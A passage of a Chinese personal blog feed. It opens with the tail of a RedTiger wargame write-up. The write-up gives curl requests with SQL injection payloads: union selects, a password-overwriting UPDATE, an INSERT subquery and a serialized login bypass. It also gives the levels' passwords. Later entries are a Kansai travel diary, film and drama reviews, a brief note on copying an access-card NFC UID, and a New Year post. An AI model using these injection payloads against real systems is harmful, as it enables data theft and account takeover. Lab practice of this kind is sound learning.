AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level7.php'; -H 'Connection: keep-alive' --data "search=') union select 1,2,autor,4 from level7_news news, level7_texts text where autor='1' or (autor='&amp;dosearch=search%21" —compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>把上条的条件改成 always true，拿出了所有数据，然后得到 google 文章的作者</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl 'https://redtiger.labs.overthewire.org/level7.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level7.php'; -H 'Connection: keep-alive' --data "search=') union select 1,2,autor,4 from level7_news news, level7_texts text where '1'='1' or (autor='&amp;dosearch=search%21" —compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="level-8">level 8<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-8" class="hash-link" aria-label="Direct link to level 8" title="Direct link to level 8">​</a></h4>
<p>反复摆弄后，会发现真的会执行一条 update 语句，似乎只有 email 项可以注入，给update 时拼一个 password，就会把密码覆盖，这样就可以登入了</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl 'https://redtiger.labs.overthewire.org/level8.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level8.php'; -H 'Connection: keep-alive' --data "email=hans%40local', password='13&amp;name=Hans&amp;icq=12345/*or&amp;age=25*/&amp;edit=Edit&amp;user=admin&amp;password=13&amp;login=Login" —compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="level-9">level 9<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-9" class="hash-link" aria-label="Direct link to level 9" title="Direct link to level 9">​</a></h4>
<p>虽然发现注入点在 text 项，但怎么也想不明白，一条 update 语句怎样才能操作好，
看了别人的答案后。。。。这似乎是一条 insert。。。。。。嗯，顺便学了下 insert 也可以 somehow 显示数据</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl 'https://redtiger.labs.overthewire.org/level9.php'; -H 'Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic; level9login=cybercyber_vuln' -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level9.php'; -H 'Connection: keep-alive' --data "autor=alex&amp;title=alexortitle&amp;text=aa'), ((select username from level9_users limit 1), (select password from level9_users limit 1), 'a&amp;post=Submit" —compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_K1VF" id="level-10">level 10<a href="https://vienna.bio/blog/%E7%8E%A9-redtiger-SQL-%E6%B3%A8%E5%85%A5-10-%E5%85%B3#level-10" class="hash-link" aria-label="Direct link to level 10" title="Direct link to level 10">​</a></h4>
<p>测试了username 和 password 都不能注入，
想不明白就看了答案，原来是一题和 serialize 函数有关的题目，
答案是把类型改成 boolean，难道源码内根据这些类型生成 sql / 作判断吗？</p>
<div class="codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-text codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain">curl 'https://redtiger.labs.overthewire.org/level10.php'; -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic; level9login=cybercyber_vuln; level10login=get_post_cookie_head__kittens_eating_all_my_bread" -H 'Origin: https://redtiger.labs.overthewire.org'; -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://redtiger.labs.overthewire.org/level10.php'; -H 'Connection: keep-alive' --data "login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30&amp;dologin=Login" —compressed</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="SQL Injection" term="SQL Injection"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[2017 关西游记]]></title>
        <id>https://vienna.bio/blog/2017-关西游记</id>
        <link href="https://vienna.bio/blog/2017-关西游记"/>
        <updated>2018-01-06T21:37:40.000Z</updated>
        <summary type="html"><![CDATA[去年国庆去了日本关西，行程比较随意。最近再翻看照片时，发觉旅程中有很多有意思的地方。]]></summary>
        <content type="html"><![CDATA[<p>去年国庆去了日本关西，行程比较随意。最近再翻看照片时，发觉旅程中有很多有意思的地方。</p>
<p>很多图，点开注意</p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="day-1">Day 1<a href="https://vienna.bio/blog/2017-%E5%85%B3%E8%A5%BF%E6%B8%B8%E8%AE%B0#day-1" class="hash-link" aria-label="Direct link to Day 1" title="Direct link to Day 1">​</a></h2>
<p>第一天住处在皇居附近，所以步行经过时就走了进去</p>
<p><img decoding="async" loading="lazy" alt="画中人在画画" src="https://vienna.bio/assets/images/IMG_0130-383eeb8aea11458b54eea15569247bd8.jpg" width="1280" height="960" class="img_GQDY"></p>
<p>感觉环境比较开阔，有二三对新人在拍照</p>
<p><img decoding="async" loading="lazy" alt="开阔的环境" src="https://vienna.bio/assets/images/IMG_0140-6f34c95ba8ceb6831eadbcd5b2a618ca.jpg" width="960" height="1280" class="img_GQDY"></p>
<p>有不少园林布置，也曾在苏州、番禺看过几处园子，但没有占地这么大，维护得这么好的，看来日本这边经费还是比较足（毕竟皇居？）</p>
<p><img decoding="async" loading="lazy" alt="园林 1" src="https://vienna.bio/assets/images/IMG_0183-8e6eaa21f5f90af4d853f6be6bff0bae.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="园林 2" src="https://vienna.bio/assets/images/IMG_0186-9fb916400a3181a1d40b4149e46f5926.png" width="1280" height="960" class="img_GQDY"></p>
<p>人停在这些开阔的地方心情还是会比较清爽一些。</p>
<p>后续出发去坐岚山小火车。</p>
<p>小火车旁有枫叶，峡下有涌流，车里就有这张朋友觉得不错的照片</p>
<p><img decoding="async" loading="lazy" alt="小火车内" src="https://vienna.bio/assets/images/IMG_0222-c94e37d8b7bd62769cf7ea662337bfe8.png" width="960" height="1280" class="img_GQDY"></p>
<p>下车的地方是大片田野日落，这个场景岂能不拍照？</p>
<p><img decoding="async" loading="lazy" alt="田野日落" src="https://vienna.bio/assets/images/IMG_0279-7172807589c232345f72134f4d40eed7.png" width="1280" height="960" class="img_GQDY"></p>
<p>一个人的晚餐，别看这顿颜色丰富，我还是不太会欣赏这方面的日料，不觉得很好吃，最好吃的还是日本的零食</p>
<p><img decoding="async" loading="lazy" alt="好看但没有很好吃" src="https://vienna.bio/assets/images/IMG_0288-286b434cf8288f4eadde424ae9c48dea.png" width="1280" height="960" class="img_GQDY"></p>
<p>morris 青旅的大门，没什么特别，青旅前台是第一个认出了我衣服上 one piece 图案的人 （海贼王的确很火）</p>
<p><img decoding="async" loading="lazy" alt="青旅大门，没什么特别" src="https://vienna.bio/assets/images/IMG_0295-e3883d7576a69fa99cfbcb4e78a140bf.png" width="1280" height="960" class="img_GQDY"></p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="day-2">Day 2<a href="https://vienna.bio/blog/2017-%E5%85%B3%E8%A5%BF%E6%B8%B8%E8%AE%B0#day-2" class="hash-link" aria-label="Direct link to Day 2" title="Direct link to Day 2">​</a></h2>
<p>每天住处不一样，第二天到了 Suzuki Guesthouse，青旅放置了全系列海贼王</p>
<p><img decoding="async" loading="lazy" alt="全系列海贼王" src="https://vienna.bio/assets/images/IMG_0303-24a76ab2d333379e9556f10348cc0650.png" width="1280" height="960" class="img_GQDY"></p>
<p>第二天开始走访一些著名的景点，虽然我不太喜欢太多游客的地方，但『来都来了』，第二天有雨</p>
<p><img decoding="async" loading="lazy" alt="祇園某处？" src="https://vienna.bio/assets/images/IMG_0329-70716c9f4d7cb6f621f95de55749054a.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="祇園某猫？" src="https://vienna.bio/assets/images/IMG_0350-05ba39b48671b5cfb611d1a9aaca052b.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="清水寺附近的路，有种如晴天似雨天的感觉" src="https://vienna.bio/assets/images/IMG_0388-e58953ee7d6e4086cf24b3f4218016ff.png" width="960" height="1280" class="img_GQDY"></p>
<p>沿途小路旁还有很多石佛像，随便乱走看了坂本龙马的墓地，不放照片了。</p>
<p>清水寺上看的远景，下山后吃了些抹茶甜品，也不放照片了。</p>
<p>晚上随便坐车去到平安神宫外面。
平安神宫看来不是什么旧古迹，被活化过看起来更像一个书店/活动区/休息区</p>
<p>在书店逛了几分钟，书店外面却正在准备杂耍表演，随意放几个照片吧，反正当时挺意外惊喜的，路上行人都坐地上看表演，这种气氛还是比较不错，心情又好了起来</p>
<p><img decoding="async" loading="lazy" alt="小朋友很兴奋" src="https://vienna.bio/assets/images/IMG_0462-f876ed4a7a02c3374ab77951038a27a4.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="演员的合照" src="https://vienna.bio/assets/images/IMG_0468-fd917decf8ae12e7b1b0ab468ee47a08.png" width="1280" height="960" class="img_GQDY"></p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="day-3">Day 3<a href="https://vienna.bio/blog/2017-%E5%85%B3%E8%A5%BF%E6%B8%B8%E8%AE%B0#day-3" class="hash-link" aria-label="Direct link to Day 3" title="Direct link to Day 3">​</a></h2>
<p>Suzuki 的老板介绍我去二条城，毕竟就在青旅旁边。。（PS 老板好像是台湾的，后来才发觉大家都会讲国语囧）</p>
<p>大早上给护城河拍了一张，后来发现这张照片是个飞鸟与游鱼的故事</p>
<p><img decoding="async" loading="lazy" alt="飞鸟与游鱼" src="https://vienna.bio/assets/images/IMG_0488-cfc70a59dc2dbcbf17657f912dba3718.png" width="960" height="1280" class="img_GQDY"></p>
<p>城内似乎在搞活动（大政奉还 xx 年纪念），有学生来游玩，有摊位买零食</p>
<p><img decoding="async" loading="lazy" alt="抹茶与抹茶团子" src="https://vienna.bio/assets/images/IMG_0500-bec180dcb0b71ca22da85503b48b3a2d.png" width="960" height="1280" class="img_GQDY"></p>
<p>之后就是两三张城内风景了</p>
<p><img decoding="async" loading="lazy" alt="似乎两家人在举行婚礼" src="https://vienna.bio/assets/images/IMG_0512-98d837c585dc3adbe6698efa833d2fa8.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="城头远景" src="https://vienna.bio/assets/images/IMG_0554-10d9de5593f22383372f17ee3ad81579.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="地上植物" src="https://vienna.bio/assets/images/IMG_0571-a8201382d9512dbe33fc7a6b80071d17.png" width="1280" height="960" class="img_GQDY"></p>
<p>上午逛了二条城，内部不允许拍照，就没有照片，其实就是电视剧里将军住的地方？不及外面房子外好看，下午出发到奈良了。</p>
<p><img decoding="async" loading="lazy" alt="途上的猫" src="https://vienna.bio/assets/images/IMG_0676-381a24d39e4378dbd5b90f5fe9b71fcd.png" width="960" height="1280" class="img_GQDY"></p>
<p>期间胡乱迷途，火车旁的风光略去。</p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="day-4">Day 4<a href="https://vienna.bio/blog/2017-%E5%85%B3%E8%A5%BF%E6%B8%B8%E8%AE%B0#day-4" class="hash-link" aria-label="Direct link to Day 4" title="Direct link to Day 4">​</a></h2>
<p>奈良公园内，遍地都是鹿</p>
<p><img decoding="async" loading="lazy" alt="鹿" src="https://vienna.bio/assets/images/IMG_0758-23179fb119211145a3620ecbb2213026.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="鹿" src="https://vienna.bio/assets/images/IMG_0782-8eb21e197e0582265c275fe81a808ecd.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="鹿" src="https://vienna.bio/assets/images/IMG_0961-5650e7785543aef0bd35f1acc1094028.png" width="960" height="1280" class="img_GQDY"></p>
<p>这个寺很大，维护也好，大门里有俩超大的木门神 （无图）</p>
<p><img decoding="async" loading="lazy" alt="很大的寺" src="https://vienna.bio/assets/images/IMG_0930-d3594e9a218a783d0b5aa6d22a0e3f86.png" width="1280" height="960" class="img_GQDY"></p>
<p>奈良不是看鹿吗，为什么拍了一只虾？</p>
<p><img decoding="async" loading="lazy" alt="偶遇小虾 ?!" src="https://vienna.bio/assets/images/IMG_0751-46dcc5b52b701159d76245cf774b3449.png" width="960" height="1280" class="img_GQDY"></p>
<p>奈良不是看鹿吗，为什么拍了一只 44？</p>
<p><img decoding="async" loading="lazy" alt="偶遇 44 ?!" src="https://vienna.bio/assets/images/IMG_0933-7ebae549b8bbccf0ac0ec213e34e2385.png" width="1280" height="960" class="img_GQDY"></p>
<p>忘记了如何就走到高处，循例拍个远景</p>
<p><img decoding="async" loading="lazy" alt="寺里高处远景" src="https://vienna.bio/assets/images/IMG_0992-22054aab0bdf35f6d669e70a0b547fc3.png" width="1280" height="960" class="img_GQDY"></p>
<p>下面是一些比较随意的照片</p>
<p><img decoding="async" loading="lazy" alt="无名小路" src="https://vienna.bio/assets/images/IMG_1008-0cab209e5094c6d25987fa1e673c8163.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="日本人也长寿" src="https://vienna.bio/assets/images/IMG_1013-eab9495cc4b40f477caeb0f662d27afd.png" width="960" height="1280" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="湖边，边看风景边吃三文治" src="https://vienna.bio/assets/images/IMG_1127-a743c93b52a9364707152a265bbe1146.png" width="1280" height="960" class="img_GQDY"></p>
<p>从奈良公园下来，准备回去住处时，偶然经过网上介绍的中谷堂麻薯，当然是要买买吃吃啦！</p>
<p>没有给麻薯拍照，不过在旁边拍了张小女孩与猫，小孩子和猫都很萌</p>
<p><img decoding="async" loading="lazy" alt="中谷堂旁边 - 小女孩与猫" src="https://vienna.bio/assets/images/IMG_1138-7d1beafa12748571a9d4a31ad59c7e74.png" width="960" height="1280" class="img_GQDY"></p>
<p>青旅的第一个香港游客，和青旅经理小小聊了一下奈良行程（两个不怎么会英文的人聊得指手画脚。。）</p>
<p><img decoding="async" loading="lazy" alt="经理给香港戳上一个图钉" src="https://vienna.bio/assets/images/IMG_1143-ac7caa299b30324dd32c67f880ee1354.png" width="960" height="1280" class="img_GQDY"></p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="day-5">Day 5<a href="https://vienna.bio/blog/2017-%E5%85%B3%E8%A5%BF%E6%B8%B8%E8%AE%B0#day-5" class="hash-link" aria-label="Direct link to Day 5" title="Direct link to Day 5">​</a></h2>
<p>完了奈良行程再次回到京都，那一天留给了琉璃光院</p>
<p>在鸭川等公交，不像是景点但挺好看的</p>
<p>琉璃光院只在春秋季开放，其时正开放了几天（10月1日秋季开放），正好游客还不多
以下是琉璃光院的照片</p>
<p><img decoding="async" loading="lazy" alt="琉璃光院" src="https://vienna.bio/assets/images/IMG_1310-c285ca03c646bf36945afa5bb49e4f0f.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="琉璃光院" src="https://vienna.bio/assets/images/IMG_1324-e854386bed53f4aa79f36ce143182e62.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="琉璃光院" src="https://vienna.bio/assets/images/IMG_1356-14d5a2a34d6160c861186ad2dcfa6eea.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="琉璃光院" src="https://vienna.bio/assets/images/IMG_1377-e8780933301785546bb8500266b4fa76.png" width="1280" height="960" class="img_GQDY"></p>
<p><img decoding="async" loading="lazy" alt="琉璃光院" src="https://vienna.bio/assets/images/IMG_1395-7e26166e21f5e15abbda3029d9c2e6d7.png" width="1280" height="960" class="img_GQDY"></p>
<p>最后一晚在大阪住，离机场要近一些，
晚上吃了些肉串，喝了点清酒</p>
<h2 class="anchor anchorWithStickyNavbar_K1VF" id="day-6">Day 6<a href="https://vienna.bio/blog/2017-%E5%85%B3%E8%A5%BF%E6%B8%B8%E8%AE%B0#day-6" class="hash-link" aria-label="Direct link to Day 6" title="Direct link to Day 6">​</a></h2>
<p>在大阪去了海洋馆和大阪城，深夜回港，这个就不放什么照片了。</p>
<p>完
谢谢观看</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[韩剧《记忆》]]></title>
        <id>https://vienna.bio/blog/韩剧《记忆》</id>
        <link href="https://vienna.bio/blog/韩剧《记忆》"/>
        <updated>2017-07-29T22:42:00.000Z</updated>
        <summary type="html"><![CDATA[『请用尽全力去幸福吧』，剧末的最后一句话。]]></summary>
        <content type="html"><![CDATA[<p>『请用尽全力去幸福吧』，剧末的最后一句话。</p>
<p>韩剧的绝症套路吗？能打动人就好。话说看着这剧想到的诺奖得主高锟，同样的疾病。噢原来从知道高锟这个人到现在过好些年了。。</p>
<p>剧中开始部分主角约了家人，但到达后却忘了位置，大概就是无助急切时的样子？</p>
<p><img decoding="async" loading="lazy" alt="剧中主角朴泰硕" src="https://vienna.bio/assets/images/memory-73472153c654af3de4a50fdadd33401f.jpg" width="966" height="1408" class="img_GQDY"></p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="韩剧" term="韩剧"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[刚刚看了《海边的曼切斯特》]]></title>
        <id>https://vienna.bio/blog/刚刚看了《海边的曼切斯特》</id>
        <link href="https://vienna.bio/blog/刚刚看了《海边的曼切斯特》"/>
        <updated>2017-03-04T21:00:45.000Z</updated>
        <summary type="html"><![CDATA[略闻获奥斯卡不知道什么奖，电影名字不错，就看了。]]></summary>
        <content type="html"><![CDATA[<p>略闻获奥斯卡不知道什么奖，电影名字不错，就看了。<br>
<!-- -->剧情顺畅平凡打动观众，看着男主的行为观众也被牵动代入剧中。各个角色的性格表现安排也合适出色。</p>
<p>整个片子的呈现，拿捏很好。留意片子每个细节每个小动作吧，嗯</p>
<p>Manchester by the Sea<br>
<!-- -->2017.</p>
<p><img decoding="async" loading="lazy" alt="Manchester By The Sea" src="https://vienna.bio/assets/images/theboat-372f92ae2a8b177e31d101e474a7084c.png" width="1600" height="900" class="img_GQDY"></p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="电影" term="电影"/>
        <category label="剧情" term="剧情"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[成功把门禁的 NFC UID 复制到手机]]></title>
        <id>https://vienna.bio/blog/成功把门禁的-NFC-UID-复制到手机</id>
        <link href="https://vienna.bio/blog/成功把门禁的-NFC-UID-复制到手机"/>
        <updated>2017-03-01T00:35:10.000Z</updated>
        <summary type="html"><![CDATA[其实就是照着 如何利用Nexus 5伪造一张门禁卡 和 修改NFC手机的默认UID 搞就行。]]></summary>
        <content type="html"><![CDATA[<p>其实就是照着 <a href="http://www.freebuf.com/news/topnews/80368.html" target="_blank" rel="noopener noreferrer">如何利用Nexus 5伪造一张门禁卡</a> 和 <a href="http://www.enjoydiy.com/3539.html" target="_blank" rel="noopener noreferrer">修改NFC手机的默认UID</a> 搞就行。
楼层里发现原始来源：<a href="http://stackoverflow.com/questions/28409934/editing-functionality-of-host-card-emulation-in-android" target="_blank" rel="noopener noreferrer">http://stackoverflow.com/questions/28409934/editing-functionality-of-host-card-emulation-in-android</a>，厉害了</p>
<p>最近因为要提取 WIFI 密码而把手机 root 了，也用了有些年了，保修早就过了。正好手上有个门禁卡，也刚好再需要多一个，就把留在脑袋的一丝印象捞出来玩玩。</p>
<p>第一次漏了长度字节没加上，不成功之余，手机的 NFC 功能也不能工作，一度以为不兼容搞不定。后来发现后加上漏掉的一字节就好了。</p>
<p>虽然只能复制 Mifare M1 的 UID，但在我的情况里就已经够用了。其实x宝也是三四十块钱就能买一个简易的复制工具（需要配套可写 UID 的 NFC Tag）。</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="NFC" term="NFC"/>
        <category label="Android" term="Android"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[2017 Happy New Year! 新年好]]></title>
        <id>https://vienna.bio/blog/2017-Happy-New-Year-新年好</id>
        <link href="https://vienna.bio/blog/2017-Happy-New-Year-新年好"/>
        <updated>2017-01-01T00:14:42.000Z</updated>
        <summary type="html"><![CDATA[去年]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_K1VF" id="去年">去年<a href="https://vienna.bio/blog/2017-Happy-New-Year-%E6%96%B0%E5%B9%B4%E5%A5%BD#%E5%8E%BB%E5%B9%B4" class="hash-link" aria-label="Direct link to 去年" title="Direct link to 去年">​</a></h2>
<p>年初的记忆已经模糊，应该是和学业有关的事情。似乎曾有一段<a href="https://dd3.org/archives/2016/03/" target="_blank" rel="noopener noreferrer">看剧的日子</a>。
五六月推测是毕设提交期，最后也就那样了，导师 Oliver 是个好人，去年没选错毕设课题。
在考完试后，我的大学时光也要完结。 OUHK 收了不是优秀学生的我，到现在毕业，我觉得 OU 的教育是有意义的，遇到的教授同学，嗯。  2016 是压抑和兴奋的一年，虽然其中有几个月比较沉寂，但我应该会记得 2016 的事情。</p>
<p>六月到了杭州，之后变成一场旅行。 在杭州见了表哥，也谈了各种东西，像是认识了一个朋友。</p>
<p>流连杭州时在群主家中做客，群主壕人，每每请吃，我都不好意思然后就吃了。 期间又一好朋友来作客，然后我们又去吃。写到这里，又记起一起看电影的画面。 杭州很好，人与风景。之后在上海见了 IB，当晚下雨。</p>
<p>之后迎来了工作，此时已经入职一段时间。</p>
